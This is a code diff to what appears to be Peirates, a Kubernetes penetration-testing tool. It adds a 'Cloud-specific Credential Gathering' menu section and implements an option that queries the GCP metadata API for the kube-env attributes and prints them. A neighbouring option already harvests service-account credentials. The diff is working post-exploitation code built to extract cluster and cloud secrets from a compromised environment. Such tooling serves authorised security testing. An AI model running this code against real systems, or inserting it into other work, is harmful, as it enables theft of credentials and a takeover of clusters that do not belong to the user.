@@ -818,10 +818,15 @@ Vulnerabilities and Misconfiguration Searching |
 [10] Check all pods for volume mounts
 [11] Launch a pod mounting its node's host filesystem
 [12] Request list of pods from a Kubelet [not yet implemented]
+
+------------------------------------------------+
+Cloud-specific Credential Gathering             |
+------------------------------------------------+
+
 [13] Request IAM credentials from AWS Metadata API [AWS only]
 [14] Request IAM credentials from GCP Metadata API [GCP only]
 [15] Request kube-env from AWS Metadata API [AWS only] [not yet implemented]
-[16] Request kube-env from GCP Metadata API [GCP only] [not yet implemented]
+[16] Request kube-env from GCP Metadata API [GCP only]
 
 ------+
 Pivot |
@@ -1026,7 +1031,6 @@ Peirates:># `)
 		case "14":
 			// Create a new HTTP client that uses the correct headers
 			client := &http.Client{
-				// CheckRedirect: redirectPolicyFunc,
 			}
 			// Make a request for our service account(s)
 			req_accounts, err := http.NewRequest("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
@@ -1059,8 +1063,31 @@ Peirates:># `)
 				println(string(body_2))
 			}
 			break
+		
+		// [16] Request kube-env from GCP Metadata API [GCP only]
+		case "16":
+			// Create a new HTTP client that uses the correct headers
+			client := &http.Client{
+			}
+			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
+			req_kube, err := http.NewRequest("GET","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
+			req_kube.Header.Add("Metadata-Flavor", "Google")
+			resp, err := client.Do(req_kube)
+			if err != nil {
+				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+			}
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			if resp.StatusCode != 200 {
+				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n",resp.StatusCode)
+				break
+			}
+			lines := strings.Split(string(body), "\n")
+			for _,line := range lines {
+				println(line)
+			}
 
-
+			break
 
 		case "19":
 			break
